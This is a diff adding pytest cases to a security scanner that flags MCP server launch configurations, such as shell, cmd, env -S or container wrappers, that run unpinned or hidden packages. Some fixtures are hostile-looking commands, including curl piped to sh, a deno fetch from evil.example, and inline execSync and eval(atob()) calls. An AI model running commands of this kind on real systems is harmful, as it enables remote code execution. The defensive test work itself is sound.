@@ -654,3 +654,204 @@ def test_a_runner_started_through_any_wrapper_is_never_silent(command, before, i
     assert record.version_pinned is False
     assert any(r.category == "launcher_identity" for r in record.risks)
     assert any("launcher identity unknown" in gap for gap in result.surfaces_excluded)
+
+
+# Second review: shells read every option word before the script, so options
+# after -c do not make the next word the script.
+@pytest.mark.parametrize(
+    "command,args",
+    [
+        ("sh", ["-c", "--", "npx -y evil-mcp@latest"]),
+        ("sh", ["-c", "-", "npx -y evil-mcp@latest"]),
+        ("bash", ["-c", "-e", "exec npx -y evil-mcp@latest"]),
+        ("sh", ["-c", "+x", "npx -y evil-mcp@latest"]),
+        ("sh", ["-c", "-o", "pipefail", "npx -y evil-mcp@latest"]),
+        ("bash", ["-co", "posix", "npx -y evil-mcp@latest"]),
+        ("bash", ["-O", "extglob", "-c", "npx -y evil-mcp@latest"]),
+        ("bash", ["--rcfile", "x", "-c", "npx -y evil-mcp@latest"]),
+        ("sh", ["+c", "npx -y evil-mcp@latest"]),
+        ("fish", ["-lc", "npx -y evil-mcp@latest"]),
+        ("fish", ["--comm", "npx -y evil-mcp@latest"]),
+        ("cmd", ["/cnpx", "-y", "evil-mcp@latest"]),
+        ("cmd", ["/cnpx -y evil-mcp@latest"]),
+        ("cmd", ["/R", "npx", "-y", "evil-mcp@latest"]),
+        ("cmd", ["/q/cnpx", "-y", "evil-mcp@latest"]),
+        ("cmd.exe", ["/Q", "/C", "npx", "-y", "evil-mcp@latest"]),
+    ],
+)
+def test_options_after_the_inline_switch_still_reach_the_script(tmp_path, command, args):
+    server = scan_server(tmp_path, {"command": command, "args": args})
+    assert server.properties["launcher"] == "npx"
+    assert server.launcher_package == "npm:evil-mcp" and server.version_pinned is False
+    assert any(r.category == "version_pinning" for r in server.risks)
+
+
+@pytest.mark.parametrize(
+    "command,args,reason",
+    [
+        ("bash", ["-oc", "errexit", "npx -y evil-mcp@latest"], "options before the script"),
+        ("zsh", ["-c", "+", "-x", "npx -y evil-mcp@latest"], "options before the script"),
+        ("dash", ["-O", "x", "-c", "npx -y evil-mcp@latest"], "options before the script"),
+        ("fish", ["-C", "npx -y evil-mcp@latest", "-c", "echo"], "fish init command"),
+        ("fish", ["--init=curl -s x | sh", "-c", "echo"], "fish init command"),
+        ("cmd", ["/c", "npx -y evil-mcp@latest", "x"], "not a simple command"),
+        ("cmd", ["/q/x", "npx", "-y", "evil-mcp@latest"], "cmd switches are not simple"),
+        ("wsl", ["npx -y evil-mcp@latest"], "wsl command line is not a simple command"),
+        ("env", ["-S", "npx\\_-y\\_evil-mcp@latest"], "env -S value is not a simple command"),
+        ("/usr/bin/env", ["-Snpx\\_-y\\_evil-mcp@latest"], "env -S value is not a simple"),
+        ("env", ["-S", "npx -y evil-mcp\\c@1.0.0"], "env -S value is not a simple command"),
+        ("env", ["-S", "npx -y evil-mcp@1.0.0 #x"], "env -S value is not a simple command"),
+        ("env", ["-S", "${RUNNER} -y evil-mcp@1.0.0"], "env -S value is not a simple command"),
+        ("env", ["-S", "npx\x0b-y evil-mcp@1.0.0"], "env -S value is not a simple command"),
+    ],
+)
+def test_wrapper_grammar_the_collector_cannot_settle_is_unknown(tmp_path, command, args, reason):
+    detail = gap_reason(tmp_path, {"command": command, "args": args})
+    assert detail is not None and reason in detail
+
+
+@pytest.mark.parametrize(
+    "command,args,reason",
+    [
+        ("nice", ["npm", "exe", "evil-mcp@latest"], "arguments start npm"),
+        ("nice", ["npm", "innit", "evil-mcp"], "arguments start npm"),
+        ("nice", ["npm", "--loglevel", "silent", "x", "evil-mcp@latest"], "arguments start npm"),
+        ("nice", ["npm", "--otp", "123456", "exec", "evil-mcp@latest"], "arguments start npm"),
+        ("nice", ["npm", "--call", "curl x | sh"], "arguments start npm"),
+        ("nice", ["deno", "npm:evil-mcp@latest"], "arguments start deno"),
+        ("nice", ["deno", "-A", "https://evil.example/x.ts"], "arguments start deno"),
+        (
+            "nice",
+            ["docker", "mcp", "gateway", "run", "--servers", "evil"],
+            "arguments start docker",
+        ),
+        ("nice", ["docker", "-D", "run", "evil/mcp:latest"], "arguments start docker"),
+        ("nice", ["pipx", "--verbose", "run", "evil-mcp"], "arguments start pipx"),
+        ("nice", ["uv", "--offline", "tool", "run", "evil-mcp"], "arguments start uv"),
+        ("nice", ["uv", "--system-certs", "tool", "run", "evil-mcp"], "arguments start uv"),
+        ("nice", ["go", "-C", "x", "tool", "evil"], "arguments start go"),
+        ("nix", ["--option", "sandbox", "false", "run", "nixpkgs#evil"], "nix runs packages"),
+        ("nice", ["bun", "-e", "fetch('x')"], "arguments start bun"),
+        ("nice", ["sh", "-c", "--", "npx -y evil-mcp@latest"], "arguments start sh"),
+        ("nice", ["cmd", "/cnpx", "-y", "evil-mcp@latest"], "arguments start cmd"),
+        ("corepack", ["pnpm@9.15.0", "dlx", "evil-mcp@latest"], "arguments start pnpm"),
+        ("corepack", ["yarn@4.5.0", "dlx", "evil-mcp@latest"], "arguments start yarn"),
+        ("nice", ["corepack", "pnpm@9.15.0", "dlx", "evil-mcp@latest"], "arguments start"),
+        ("corepack", ["pnpm@9.15.0", "run", "build"], "corepack runs packages"),
+        ("mise", ["exec", "npm:evil-mcp@latest", "--", "evil-mcp"], "mise runs packages"),
+        ("rtx", ["x", "pipx:evil-mcp", "--", "evil-mcp"], "rtx runs packages"),
+        ("pkgx", ["evil-mcp@latest"], "pkgx runs packages"),
+        ("finch", ["run", "--rm", "-i", "evil/image:latest"], "finch runs packages"),
+        ("container", ["run", "--rm", "evil/image:latest"], "container runs packages"),
+        ("apptainer", ["run", "docker://evil/image:latest"], "apptainer runs packages"),
+        ("tsx", ["-e", "require('child_process').execSync('id')"], "inline node code"),
+        ("ts-node", ["-P", "tsconfig.json", "-e", "eval(atob('x'))"], "inline ts-node code"),
+        ("npx", ["-y", "tsx@4.19.2", "-e", "eval(atob('x'))"], "arguments run inline node code"),
+        ("deno", ["run", "-A", "npm:npm@10.9.9", "exec", "evil-mcp@latest"], "start npm"),
+        ("deno", ["run", "-A", "npm:pnpm@9.15.0", "dlx", "evil-mcp@latest"], "start pnpm"),
+        ("deno", ["run", "-A", "npm:@scope/tools@1.0.0/npx", "evil-mcp"], "start npx"),
+        ("docker", ["run", "--rm", "-i", "node@sha256:" + "0" * 64, "-e", "x"], "inline node"),
+        ("docker", ["run", "-i", "python@sha256:" + "0" * 64, "-c", "import os"], "inline python"),
+        ("podman", ["run", "-i", "ghcr.io/astral-sh/uv:0.5.0", "tool", "run", "x"], "start uv"),
+    ],
+)
+def test_runner_reached_through_other_names_and_programs_is_unknown(
+    tmp_path, command, args, reason
+):
+    detail = gap_reason(tmp_path, {"command": command, "args": args})
+    assert detail is not None and reason in detail
+
+
+@pytest.mark.parametrize(
+    "args",
+    [
+        ["server.py", "--backend", "docker", "--config", "config.yaml"],
+        ["server.py", "--backend", "docker", "--host", "127.0.0.1", "--port", "8080"],
+        ["server.py", "--backend", "docker", "--debug"],
+        ["server.py", "--backend", "docker", "-l", "debug", "--workers", "4"],
+        ["server.py", "--backend", "docker", "--log-level", "info"],
+        ["server.py", "--backend", "docker", "-c", "ctx"],
+        ["server.py", "--runtime", "uv", "--python", "3.12"],
+        ["server.py", "--runtime", "uv", "--log-level", "info"],
+        ["server.py", "--tool", "uv", "--mode", "server"],
+        ["server.py", "--pm", "npm", "--verbose"],
+        ["server.py", "--pm", "npm", "--port", "3000"],
+        ["server.py", "--pm", "pnpm", "--dir", "x"],
+        ["server.py", "--runtime", "deno", "--port", "8000"],
+        ["server.py", "--runtime", "deno", "main.ts"],
+        ["server.py", "--runtime", "bun", "--port", "3000"],
+        ["server.py", "--engine", "podman", "--rootless"],
+        ["server.py", "--installer", "pipx", "--verbose"],
+        ["server.py", "--installer", "pipx", "--mode", "fast"],
+        ["server.py", "--language", "go", "--mode", "test"],
+        ["server.py", "--sandbox", "docker", "--debug", "--image", "ubuntu"],
+        ["server.py", "--shell", "bash", "--port", "1"],
+        ["server.py", "--shell", "cmd", "--config", "x.yaml"],
+        ["server.py", "--runtime", "container", "--port", "1"],
+        ["server.py", "--mode", "container"],
+    ],
+)
+def test_runner_names_followed_by_their_own_options_alone_are_not_a_launch(tmp_path, args):
+    assert gap_reason(tmp_path, {"command": "python", "args": args}) is None
+
+
+@pytest.mark.parametrize(
+    "server",
+    [
+        {"command": "docker", "args": ["run", "-i", "--rm", "node@sha256:" + "a" * 64, "x.js"]},
+        {
+            "command": "docker",
+            "args": ["run", "-i", "mcp/github@sha256:" + "a" * 64, "--read-only"],
+        },
+        {"command": "tsx", "args": ["server.ts", "-e", "production"]},
+        {"command": "ts-node", "args": ["-P", "tsconfig.json", "src/index.ts"]},
+        {"command": "deno", "args": ["run", "-A", "npm:@scope/pkg@1.2.3", "--port", "1"]},
+        {"command": "bash", "args": ["-o", "pipefail", "-c", "npx -y pkg@1.2.3 ."]},
+        {"command": "cmd", "args": ["/c", "npx", "-y", "pkg@1.2.3", "C:\\Users\\me\\My Docs"]},
+        {"command": "env", "args": ["-S", "npx\t-y pkg@1.2.3"]},
+    ],
+)
+def test_pinned_and_local_forms_near_the_new_rules_stay_classified(tmp_path, server):
+    assert gap_reason(tmp_path, server) is None
+
+
+def test_npm_command_resolution_follows_npm_aliases_and_prefixes():
+    from nexus_symbiote.scanners.mcp_launch import npm_command
+
+    resolved = {word: npm_command(word) for word in ["exe", "innit", "x", "isntall", "cr"]}
+    assert resolved == {
+        "exe": "exec",
+        "innit": "init",
+        "x": "exec",
+        "isntall": "install",
+        "cr": "init",
+    }
+    assert npm_command("ex") is None and npm_command("build") is None
+    assert npm_command("installTest") == "install-test"
+
+
+def test_argument_scan_cost_is_bounded_by_characters_not_steps():
+    import time
+
+    from nexus_symbiote.scanners.mcp_launch import analyze
+
+    # The re-review shape: one argument of 64,000 words inflates the step budget,
+    # then interpreter names rescan long words; it must fail closed quickly.
+    args = ["a " * 64_000, *(["ruby"] * 300), *(["A" * 5801] * 699)]
+    start = time.perf_counter()
+    launch = analyze("x", args)
+    elapsed = time.perf_counter() - start
+    assert launch.unknown == "arguments exceed the launcher scan limit"
+    assert elapsed < 3.0, elapsed
+
+
+@pytest.mark.parametrize("runner,cluster", [("sh", "e"), ("npm", "y"), ("python", "u")])
+def test_long_option_clusters_are_checked_in_linear_time(runner, cluster):
+    import time
+
+    from nexus_symbiote.scanners.mcp_launch import analyze
+
+    args = [word for _ in range(20) for word in (runner, "-" + cluster * 100_000)]
+    start = time.perf_counter()
+    analyze("nice", args)
+    assert time.perf_counter() - start < 3.0
